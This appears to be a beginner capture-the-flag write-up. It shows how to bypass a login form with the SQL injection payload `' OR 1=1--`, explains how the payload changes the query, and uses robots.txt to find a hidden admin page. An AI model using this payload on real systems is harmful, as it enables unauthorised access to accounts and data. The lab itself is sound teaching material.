# Challenge Name
admin

# Description
Welcome to the "Admin" challenge! Your task is to uncover hidden pages and gain access to sensitive areas by bypassing login mechanisms using SQL Injection techniques.

# Difficulty
Easy

# Guide
Find out more about SQL Injection before proceeding.
https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/

The following shows SQL statement used. This query checks if there is a user with the given `username` and `password` in the `users` table. 
```
SELECT username FROM users WHERE username = 'username' AND password = 'password'
```

With a quick search for sqli you would find a payload similar to this.

```
' OR 1=1--
```
When this is injected into the username, the query would be as follows.

```
SELECT username FROM users WHERE username = '' OR 1=1--' AND password = 'password'
```
A break down of the query now

`'` is used to end the condition for username with `''`.   
Followed by `OR 1=1` which makes it so that its always true.   
Lastly the `--` which is a SQL comment, therefore ignoring the rest of the query.

Once you managed to login, it suggest that there are other pages.
There is a file commonly used to prevent robots from accessing some areas on the site robots.txt.

From the robots.txt we know that there is `/adminOnly` and user
`admin`.  
We can then login to the admin account and access `/adminOnly` to get the flag.

```
username: admin
password: ' OR 1=1--
```

# Hints
Some files are intentionally hidden from bots :)

Have you heard about SQLI

# Resources
https://ctf101.org/web-exploitation/sql-injection/what-is-sql-injection/

# Solution
By accessing `/robots.txt` we can find the following information.

```
User-agent: *
Disallow: 
/adminOnly
user:admin
```

We then go back to the login page and bypass the login to the admin account.

```
username: admin
password: ' OR 1=1--
```

Lastly we can go to `/adminOnly` and get the flag.
